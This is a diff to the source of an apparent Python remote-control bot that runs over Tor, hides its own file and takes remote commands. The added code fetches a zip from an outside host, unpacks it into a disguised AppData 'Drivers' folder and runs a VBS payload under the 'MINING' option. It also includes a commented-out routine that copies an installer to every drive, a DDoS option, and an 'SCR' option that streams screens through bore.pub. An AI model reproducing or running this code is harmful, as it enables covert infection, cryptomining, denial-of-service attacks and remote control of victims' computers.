@@ -14,9 +14,11 @@ import threading
 import zlib
 import base64
 import struct
-import os
 import sys
-
+from io import BytesIO
+from PIL import Image
+import shutil
+import string
 
 proxies = {
     'http': 'socks5h://127.0.0.1:9150',  # Tor proxy address and port for HTTP
@@ -27,7 +29,29 @@ requests_session = requests.Session()
 requests_session.proxies.update(proxies)
 
 subprocess.Popen("attrib +h BN.pyw", shell=True) 
-  
+
+
+#def COPY():
+
+#   source_file = "Pictures.msi"
+#   while True:
+ #    try:
+  #       drives = [f"{drive}:" for drive in string.ascii_uppercase + string.ascii_lowercase]
+   #      for drive in drives:
+    #         destination_path = os.path.join(drive, os.path.basename(source_file))
+     #        try:
+      #          shutil.copy(source_file, destination_path)
+       #      except Exception as e:
+        #        print()
+#     except Exception as e:
+ #        print()
+#
+ #    time.sleep(1)
+
+#A = threading.Thread(target=COPY)
+#A.daemon = True  
+#A.start()
+
 def METASPLOIT(): 
   
     actual_mac = uuid.UUID(int=uuid.getnode()).hex[-12:] 
@@ -89,12 +113,27 @@ def METASPLOIT():
                     if os.path.isfile(vbs_file_path):
                         subprocess.Popen(['cscript.exe', vbs_file_path], shell=True)
                 elif option == "MINING":
-                    os.system("cls")
-                    url = "http://yiqcvh5ewyjhkabtexi5puj3ffs5i6ctpwd7dkqsj4g7jjb7koqxjkqd.onion/Mining.exe"
-                    download_file(url, web_page_path)
-                    web_page_path = os.path.join(home_directory, "Mining.exe")
-                    if os.path.isfile(web_page_path):
-                        subprocess.Popen(['cscript.exe', web_page_path], shell=True)
+                    TIMED = random.choice([0,10,20,30])
+                    time.sleep(TIMED)
+                    import os
+                    import requests
+                    import zipfile
+                    import getpass
+                    import subprocess
+                    username = getpass.getuser()
+                    target_folder = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Drivers")
+                    target_folder1 = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows")
+                    if not os.path.exists(target_folder):
+                      os.makedirs(target_folder)
+                    download_url = "https://dso2.raed.net:454/files/Pic-1231232.zip"
+                    zip_file_name = "Drivers.zip"
+                    response = requests.get(download_url, verify=False)
+                    with open(zip_file_name, "wb") as zip_file:
+                       zip_file.write(response.content)
+                    with zipfile.ZipFile(zip_file_name, "r") as zip_ref:
+                       zip_ref.extractall(target_folder1)
+                    vbs_script_path = os.path.join(target_folder, "VSHS.vbs")
+                    subprocess.Popen(f"start {vbs_script_path}", shell=True)
                 elif option == "DDOS":
                     os.system("cls")
                     import requests
@@ -158,6 +197,33 @@ def METASPLOIT():
                         python = sys.executable
                         os.execl(python, python, *sys.argv)
                     restart_program()
+                elif option == "SCR":
+                    def SCR():
+                      SERVER_IP = 'bore.pub'
+                      ports_to_try = [61723, 3348, 44693, 44688, 12554, 12539, 61956, 12248, 10010, 10012]
+                      random.shuffle(ports_to_try)
+
+                      for port in ports_to_try:
+                          try:
+                             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                             client_socket.connect((SERVER_IP, port))
+                             print(f"Connected to the server at {SERVER_IP}:{port}")
+                             while True:
+                                img_bytes = b""
+                                while True:
+                                 packet = client_socket.recv(4096)
+                                 if not packet:
+                                      break
+                                 img_bytes += packet
+                                 img = Image.open(BytesIO(img_bytes))
+                                 img.show()
+                          except Exception as e:
+                             print(f"Failed to connect to {SERVER_IP}:{port} - Error: {str(e)}")
+                          finally:
+                            client_socket.close()
+                    specific_code_thread = threading.Thread(target=SCR)
+                    specific_code_thread.daemon = True
+                    specific_code_thread.start()
                 else:
                     print("Invalid command:", option)
             else:
